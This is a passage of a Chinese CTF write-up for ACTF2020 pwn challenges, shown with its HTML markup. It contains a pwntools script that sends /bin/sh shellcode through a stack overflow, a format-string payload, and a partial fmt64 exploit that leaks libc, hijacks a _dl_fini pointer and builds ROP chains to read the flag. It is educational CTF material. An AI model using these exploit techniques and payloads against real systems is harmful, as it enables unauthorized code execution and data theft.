class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line">prdi = <span class="number">0x0000000000400783</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">jrsp = <span class="number">0x040070B</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line">shellcode = <span class="string">'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop1</span></span><br><span class="line">offset = <span class="number">40</span></span><br><span class="line">payload = shellcode.rjust(<span class="number">32</span>,<span class="string">'\x90'</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(jrsp)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'U have read 0day!\n'</span>)</span><br><span class="line">debug()</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment"># info_addr('tag',addr)</span></span><br><span class="line"><span class="comment"># log.warning('--------------')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="fmt32"><a href="#fmt32" class="headerlink" title="fmt32"></a>fmt32</h2><ul><li>题目描述：random lucky</li><li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/pwn/fmt32/fmt32" target="_blank" rel="noopener">fmt32</a></li><li>考察点：格式化字符串漏洞</li><li>难度：入门</li><li>分值：200</li><li>完成人数：3</li></ul><p>格式化字符串漏洞，给了俩随机数<code>a1,a2</code>，让<code>a1==2*a2</code>就给flag，最简单的做法是<code>a1=a2=0</code>，对应的payload为<code>%6$n%7$n</code></p><h2 id="fmt64"><a href="#fmt64" class="headerlink" title="fmt64"></a>fmt64</h2><ul><li>题目描述：thanks to xxx</li><li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/pwn/fmt64/fmt64" target="_blank" rel="noopener">fmt64</a></li><li>考察点：格式化字符串漏洞、ROP、free_hook</li><li>难度：中等</li><li>分值：300</li><li>完成人数：2</li></ul><p>thanks to xxx? （应该不是我）这题我解出来的比较早，后来放了hint:</p><blockquote><p>hint1: stack pivot<br>hint2: hook</p></blockquote><p>嗯？hook…果然我最初的解法是非预期…</p><p>闲话少叙，回到正题，以下是非预期解：</p><h3 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h3><p>很明显是格式化字符串漏洞，要命的是保护全开了，<code>GOT</code>表，<code>fini_array</code>等函数指针只读，没法修改…</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure></div><p>而且<code>printf</code>之后没有<code>ret</code>，直接就<code>exit(0)</code>了…所以改写返回地址也没用…</p><p>开启了<code>PIE</code>倒是没什么，反正也能通过格式化字符串漏洞各种泄漏，程序代码如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">sub_9AF</span><span class="params">(FILE *a1)</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;format, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">read</span>(<span class="number">0</span>, &amp;format, <span class="number">0x100</span>uLL) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(a1, &amp;format);</span><br><span class="line">    sleep(<span class="number">1u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><code>sleep()</code>中并没有什么能利用的，那就只有<code>exit()</code>了…</p><p>于是<code>gdb</code>跟进<code>exit()</code>，发现<code>ld-2.23.so</code>中有一处函数指针可改写：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> ► 0x7effca8f7b3e &lt;_dl_fini+126&gt;    call   qword ptr [rip + 0x216404] &lt;0x7effca8e7c90&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/4xg <span class="variable">$rip</span> + 0x216404+6</span></span><br><span class="line">0x7effcab0df48 &lt;_rtld_global+3848&gt;:0x00007effca8e7c900x00007effca8e7ca0</span><br><span class="line">0x7effcab0df58 &lt;_rtld_global+3864&gt;:0x00007effca8fb0b00x0000000000000006</span><br><span class="line"></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">...</span><br><span class="line">0x7effcab0c000 0x7effcab0d000 r--p 1000  25000 /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x7effcab0d000 0x7effcab0e000 rw-p 1000  26000 /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x7effcab0e000 0x7effcab0f000 rw-p 1000  0  </span><br><span class="line">0x7ffe20323000 0x7ffe20344000 rw-p 21000 0     [stack]</span><br></pre></td></tr></table></figure></div><p>虽然开了随机化，但是试了几次，这个函数指针和<code>libc</code>之间的偏移量是不变的，因此可以利用（感觉这个<code>_dl_fini</code>里的函数指针和<code>__libc_csu_fini</code>里面的指针差不多……）</p><p>本来想着用<code>one_gadget</code>一波带走这题，但想要执行<code>exit(0)</code>必须先退出<code>while(read(0, &amp;format, 0x100uLL))</code>这个循环，有两种方法可以退出循环：</p><ul><li>关闭<code>stdin</code>：<code>p.stdin.close()</code>（适用于本地调试，打远程不行）</li><li>中断输入：<code>p.shutdown(&#39;send&#39;)</code> <a href="https://blog.csdn.net/Breeze_CAT/article/details/100087036" target="_blank" rel="noopener">ref</a></li></ul><p>不管用哪种方法，都没法继续向程序发送数据了，因此即使拿到<code>shell</code>也没用</p><p>于是，考虑构造<code>ROP</code>链，先<code>open /flag</code>再<code>read</code>+<code>write</code>把flag打印出来</p><p>跟进<code>_dl_fini</code>里面调用的那个函数，看下栈分布情况：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp  0x7ffe203411b8 —▸ 0x7effca8f7b44 (_dl_fini+132) </span><br><span class="line">01:0008│      0x7ffe203411c0 —▸ 0x7ffe203413d0 </span><br><span class="line">02:0010│      0x7ffe203411c8 ◂— 0x3000000010</span><br><span class="line">03:0018│      0x7ffe203411d0 —▸ 0x7ffe203412a0 ◂— 0x0</span><br><span class="line">04:0020│      0x7ffe203411d8 —▸ 0x7ffe203411e0 ◂— 0x26 /* '&amp;' */</span><br><span class="line">05:0028│      0x7ffe203411e0 ◂— 0x26 /* '&amp;' */</span><br><span class="line">06:0030│      0x7ffe203411e8 —▸ 0x7ffe20341310 ◂— 0x0</span><br><span class="line">07:0038│      0x7ffe203411f0 —▸ 0x7ffe203412b0 ◂— 'hhhhhhhh'</span><br></pre></td></tr></table></figure></div><p>发现通过<code>read()</code>读的数据，与当前<code>rsp</code>离得并不远，于是可以把栈迁移到可控的区域：</p><p>需要用到两个<code>gadget</code>：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p6r   &#x3D; 0x0013cc0f + libc_base</span><br><span class="line">prsp  &#x3D; 0x0000000000003838 + libc_base # pop rsp ; ret</span><br></pre></td></tr></table></figure></div><p>第一个<code>gadget</code>把多余的6个参数<code>pop</code>掉，然后第二个<code>gadget</code>直接<code>pop rsp</code>把栈迁移到<code>read</code>读的<code>buf</code></p><blockquote><p>P.s. libc中真是什么gadget都有鸭~太方便了！</p></blockquote><p>这两个<code>libc</code>中的<code>gadget</code>需要通过格式字符串漏洞写到栈中（栈中位置也是相对固定的）</p><p>此前，还需要用格式化字符串漏洞泄漏下libc和栈地址：</p><ul><li><code>libc</code>直接泄漏<code>libc_start_main_ret</code></li><li>栈的话随便找一个就行…</li></ul><p>完成栈迁移的<code>gadget</code>链如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0x7efe86626c0f &lt;__nscd_getpwnam_r+63&gt;    pop    rcx &lt;0x7efe86ada040&gt;</span><br><span class="line">0x7efe86626c10 &lt;__nscd_getpwnam_r+64&gt;    pop    rbx</span><br><span class="line">0x7efe86626c11 &lt;__nscd_getpwnam_r+65&gt;    pop    rbp</span><br><span class="line">0x7efe86626c12 &lt;__nscd_getpwnam_r+66&gt;    pop    r12</span><br><span class="line">0x7efe86626c14 &lt;__nscd_getpwnam_r+68&gt;    pop    r13</span><br><span class="line">0x7efe86626c16 &lt;__nscd_getpwnam_r+70&gt;    pop    r14</span><br><span class="line">0x7efe86626c18 &lt;__nscd_getpwnam_r+72&gt;    ret    </span><br><span class="line"> ↓</span><br><span class="line">0x7efe864ed838                           pop    rsp</span><br><span class="line">0x7efe864ed839                           ret    </span><br><span class="line"> ↓</span><br><span class="line">0x7efe8651d544 &lt;__gettextparse+1140&gt;     pop    rax ; read buf data</span><br><span class="line">0x7efe8651d545 &lt;__gettextparse+1141&gt;     ret</span><br></pre></td></tr></table></figure></div><p>读<code>flag</code>的<code>ROP</code>链如下：</p><p>open</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  0x7fd8c2bf2102 &lt;iconv+194&gt;            pop    rdi</span><br><span class="line">  0x7fd8c2bf2103 &lt;iconv+195&gt;            ret    </span><br><span class="line">   ↓</span><br><span class="line">  0x7fd8c2bf12e8 &lt;init_cacheinfo+40&gt;    pop    rsi</span><br><span class="line">  0x7fd8c2bf12e9 &lt;init_cacheinfo+41&gt;    ret    </span><br><span class="line">   ↓</span><br><span class="line">  0x7fd8c2bd2b92                        pop    rdx</span><br><span class="line">► 0x7fd8c2bd2b93                        ret             </span><br><span class="line">   ↓</span><br><span class="line">  0x7fd8c2cc8030 &lt;open64&gt;               cmp    dword ptr [rip + 0x2d2709], 0 &lt;0x7fd8c2f9a740&gt;</span><br><span class="line">  0x7fd8c2cc8037 &lt;open64+7&gt;             jne    open64+25 &lt;0x7fd8c2cc8049&gt;</span><br><span class="line">  0x7fd8c2cc8039 &lt;__open_nocancel&gt;      mov    eax, 2</span><br><span class="line">  0x7fd8c2cc803e &lt;__open_nocancel+5&gt;    syscall </span><br><span class="line">  0x7fd8c2cc8040 &lt;__open_nocancel+7&gt;    cmp    rax, -0xfff</span><br></pre></td></tr></table></figure></div><p>read</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  0x7fd8c2bf2102 &lt;iconv+194&gt;            pop    rdi</span><br><span class="line">  0x7fd8c2bf2103 &lt;iconv+195&gt;            ret    </span><br><span class="line">   ↓</span><br><span class="line">  0x7fd8c2bf12e8 &lt;init_cacheinfo+40&gt;    pop    rsi</span><br><span class="line">  0x7fd8c2bf12e9 &lt;init_cacheinfo+41&gt;    ret    </span><br><span class="line">   ↓</span><br><span class="line">  0x7fd8c2bd2b92                        pop    rdx</span><br><span class="line">► 0x7fd8c2bd2b93                        ret             </span><br><span class="line">   ↓</span><br><span class="line">  0x7fd8c2cc8250 &lt;read&gt;                 cmp    dword ptr [rip + 0x2d24e9], 0 &lt;0x7fd8c2f9a740&gt;</span><br><span class="line">  0x7fd8c2cc8257 &lt;read+7&gt;               jne    read+25 &lt;0x7fd8c2cc8269&gt;</span><br><span class="line"></span><br><span class="line">  0x7fd8c2cc8259 &lt;__read_nocancel&gt;      mov    eax, 0</span><br><span class="line">  0x7fd8c2cc825e &lt;__read_nocancel+5&gt;    syscall</span><br></pre></td></tr></table></figure></div><p>write</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  0x7fd8c2bf2102 &lt;iconv+194&gt;             pop    rdi</span><br><span class="line">  0x7fd8c2bf2103 &lt;iconv+195&gt;             ret    </span><br><span class="line">   ↓</span><br><span class="line">  0x7fd8c2bf12e8 &lt;init_cacheinfo+40&gt;     pop    rsi</span><br><span class="line">  0x7fd8c2bf12e9 &lt;init_cacheinfo+41&gt;     ret    </span><br><span class="line">   ↓</span><br><span class="line">  0x7fd8c2bd2b92                         pop    rdx</span><br><span class="line">► 0x7fd8c2bd2b93                         ret            </span><br><span class="line">   ↓</span><br><span class="line">  0x7fd8c2cc82b0 &lt;write&gt;                 cmp    dword ptr [rip + 0x2d2489], 0 &lt;0x7fd8c2f9a740&gt;</span><br><span class="line">  0x7fd8c2cc82b7 &lt;write+7&gt;               jne    write+25 &lt;0x7fd8c2cc82c9&gt;</span><br><span class="line"></span><br><span class="line">  0x7fd8c2cc82b9 &lt;__write_nocancel&gt;      mov    eax, 1</span><br><span class="line">  0x7fd8c2cc82be &lt;__write_nocancel+5&gt;    syscall</span><br></pre></td></tr></table></figure></div><blockquote><p>libc gadget真好用:D</p></blockquote><p>exp:</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./fmt64'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = <span class="string">'../libc-2.23.so'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_addr</span><span class="params">(pos)</span>:</span></span><br><span class="line">    sl(<span class="string">'LLLLLLLL%%%d$p'</span>%(pos))</span><br><span class="line">    <span class="keyword">return</span> rc()[<span class="number">8</span>:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = <span class="string">"%10$s"</span>.ljust(<span class="number">24</span>,<span class="string">'S'</span>)</span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    sl(payload)</span><br><span class="line">    <span class="keyword">return</span> rc()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alter_byte</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> data==<span class="number">0</span>:</span><br><span class="line">        payload = <span class="string">"%10$hhn"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = <span class="string">"%%%dc%%10$hhn"</span>%(data)</span><br><span class="line">    payload = payload.ljust(<span class="number">24</span>,<span class="string">'T'</span>)</span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    sl(payload)</span><br><span class="line">    <span class="keyword">return</span> rc()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alter_dw</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">    alter_byte(addr,data&amp;<span class="number">0xff</span>)</span><br><span class="line">    alter_byte(addr+<span class="number">1</span>,(data&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">    alter_byte(addr+<span class="number">2</span>,(data&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">    alter_byte(addr+<span class="number">3</span>,(data&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alter_qw</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">    alter_dw(addr,data)</span><br><span class="line">    alter_dw(addr+<span class="number">4</span>,data&gt;&gt;<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flush</span><span class="params">(c=<span class="string">'F'</span>)</span>:</span></span><br><span class="line">    sl(c*<span class="number">8</span>+<span class="string">'\0'</span>*<span class="number">0x80</span>)</span><br><span class="line">    rc()</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line">ru(<span class="string">'This\'s my mind!\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc base</span></span><br><span class="line">offset___libc_start_main_ret = <span class="number">0x20830</span></span><br><span class="line">libc_base = int(leak_addr(<span class="number">46</span>),<span class="number">16</span>)-offset___libc_start_main_ret</span><br><span class="line">info_addr(<span class="string">'libc_base'</span>,libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ld-2.23 dl_fini (function array)</span></span><br><span class="line">ld_ptr = libc_base + <span class="number">0x5f0f48</span>  <span class="comment">#_dl_fini</span></span><br><span class="line">info_addr(<span class="string">'ld_ptr'</span>,ld_ptr)</span><br><span class="line"><span class="comment"># option</span></span><br><span class="line">info_addr(<span class="string">'raw func in ptr'</span>,u64(show(ld_ptr)[:<span class="number">6</span>]+<span class="string">'\x00\x00'</span>))</span><br><span 